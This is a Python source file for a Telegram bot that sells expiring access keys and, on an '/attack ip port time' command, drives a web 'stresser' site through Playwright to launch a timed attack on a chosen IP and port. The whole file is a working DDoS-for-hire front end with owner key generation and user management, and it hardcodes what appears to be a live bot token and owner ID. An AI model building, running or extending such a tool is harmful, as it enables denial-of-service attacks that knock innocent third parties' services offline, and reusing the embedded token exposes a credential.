import nest_asyncio
nest_asyncio.apply()

import asyncio
import json
import time
import random
import string
from datetime import datetime, timedelta

from playwright.async_api import async_playwright
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

TOKEN = "8134663359:AAHMr7e5wMxsq9nGR6eFjpx35nEpoaoblj8"
OWNER_ID = 5879359815

DB_FILE = "db.json"

# ---------------- DATABASE ---------------- #

def load_db():
    try:
        with open(DB_FILE) as f:
            return json.load(f)
    except:
        return {"keys": {}, "users": {}}

def save_db():
    with open(DB_FILE,"w") as f:
        json.dump(db,f)

db = load_db()

# ---------------- PLAYWRIGHT GLOBAL ---------------- #

browser = None
context = None
page = None

# ---------------- GLOBAL ATTACK STATE ---------------- #

attack_running = False
attack_end_time = 0
attack_info = {}

# ---------------- UTILS ---------------- #

def gen_key(days):

    rand = ''.join(random.choices(string.digits, k=8))
    key = f"SPYTHER-KEY{rand}"

    expire = (datetime.now() + timedelta(days=days)).timestamp()

    db["keys"][key] = expire
    save_db()

    return key

def authorised(user_id):

    user_id = str(user_id)

    if user_id not in db["users"]:
        return False

    if time.time() > db["users"][user_id]:
        del db["users"][user_id]
        save_db()
        return False

    return True


# ---------------- COMMANDS ---------------- #

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):

    await update.message.reply_text(
        "👋 Welcome\n\nUse /help to see available commands"
    )


async def helpcmd(update: Update, context: ContextTypes.DEFAULT_TYPE):

    msg = """
📜 Available Commands

/attack ip port time
/redeem key
/when

Owner:
/gen days
/users
"""

    await update.message.reply_text(msg)


# ---------------- GEN KEY ---------------- #

async def gen(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not an owner")
        return

    try:
        days = int(context.args[0])

        key = gen_key(days)

        await update.message.reply_text(
            f"🔑 Key Generated\n\n{key}\n\nValid for {days} days"
        )

    except:
        await update.message.reply_text("Usage: /gen days")


# ---------------- REDEEM ---------------- #

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):

    try:
        key = context.args[0]

        if key not in db["keys"]:
            await update.message.reply_text("❌ Invalid key")
            return

        expire = db["keys"][key]

        user_id = str(update.effective_user.id)

        db["users"][user_id] = expire

        del db["keys"][key]

        save_db()

        days = int((expire - time.time()) / 86400)

        await update.message.reply_text(
            f"✅ Access Activated\n\nValid for {days} days"
        )

    except:
        await update.message.reply_text("Usage: /redeem key")


# ---------------- USERS ---------------- #

async def users(update: Update, context: ContextTypes.DEFAULT_TYPE):

    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ You are not an owner")
        return

    msg = "👥 Authorised Users\n\n"

    for u in db["users"]:
        remain = int((db["users"][u] - time.time())/86400)
        msg += f"{u} : {remain} days\n"

    await update.message.reply_text(msg)


# ---------------- WHEN ---------------- #

async def when(update: Update, context: ContextTypes.DEFAULT_TYPE):

    global attack_running, attack_end_time

    if not attack_running:
        await update.message.reply_text("No attack running")
        return

    remaining = int(attack_end_time - time.time())

    await update.message.reply_text(
        f"⏱ Remaining Time : {remaining}s"
    )


# ---------------- ATTACK ---------------- #

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE):

    global attack_running, attack_end_time, attack_info, page

    if not authorised(update.effective_user.id):
        await update.message.reply_text("❌ You are not authorised")
        return

    if attack_running:

        await update.message.reply_text(
            "⚠️ An attack is already running\nUse /when to see remaining time"
        )
        return

    try:

        ip = context.args[0]
        port = context.args[1]
        duration = int(context.args[2])

        if duration > 300:
            await update.message.reply_text("❌ Max time is 300")
            return

        # -------- PLAYWRIGHT ACTION -------- #

        await page.get_by_role("textbox", name="104.29.138.132").fill(ip)
        await page.get_by_role("textbox", name="80").fill(port)
        await page.get_by_role("textbox", name="60").fill(str(duration))

        await page.get_by_role("button", name="Launch").click()

        # ---------------------------------- #

        attack_running = True
        attack_end_time = time.time() + duration

        attack_info = {
            "ip": ip,
            "port": port,
            "time": duration
        }

        msg = await update.message.reply_text(
f"""🚀 Attack Started

ip : {ip}
port : {port}
time : {duration}

Remaining time: {duration}s"""
        )

        while True:

            remaining = int(attack_end_time - time.time())

            if remaining <= 0:
                break

            await msg.edit_text(
f"""🚀 Attack Started

ip : {ip}
port : {port}
time : {duration}

Remaining time: {remaining}s"""
            )

            await asyncio.sleep(1)

        attack_running = False

        await msg.edit_text(
f"""✅ Attack Finished

ip : {ip}
port : {port}
time : {duration}"""
        )

    except:
        await update.message.reply_text("Usage: /attack ip port time")


# ---------------- START PLAYWRIGHT ---------------- #

async def start_browser():

    global browser, context, page

    playwright = await async_playwright().start()

    browser = await playwright.chromium.launch(headless=False)

    context = await browser.new_context()

    page = await context.new_page()

    await page.goto("https://satellitestress.st/attack")


# ---------------- MAIN ---------------- #

async def main():

    await start_browser()

    app = ApplicationBuilder().token(TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", helpcmd))
    app.add_handler(CommandHandler("gen", gen))
    app.add_handler(CommandHandler("redeem", redeem))
    app.add_handler(CommandHandler("users", users))
    app.add_handler(CommandHandler("when", when))
    app.add_handler(CommandHandler("attack", attack))

    print("Bot started...")

    await app.run_polling()


if __name__ == "__main__":
    asyncio.run(main())